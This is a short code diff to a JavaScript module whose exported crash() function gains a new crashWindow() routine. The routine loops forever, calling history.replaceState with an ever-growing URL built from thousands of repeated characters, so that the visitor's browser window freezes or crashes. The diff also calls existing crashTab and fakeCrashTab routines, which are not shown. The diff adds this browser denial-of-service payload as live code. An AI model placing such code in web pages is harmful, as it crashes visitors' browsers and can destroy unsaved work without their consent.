@@ -1,8 +1,15 @@
 export function crash() {
 	history.pushState(undefined, '', location.href);
+	crashWindow();
 	crashTab();
 	fakeCrashTab();
 	history.replaceState(undefined, '', location.href);
+}
+
+function crashWindow() {
+	const payload = 'ඞ'.repeat(10_000);
+	let cum = '';
+	for (;;) history.replaceState(undefined, '', (cum += payload));
 }
 
 function crashTab() {
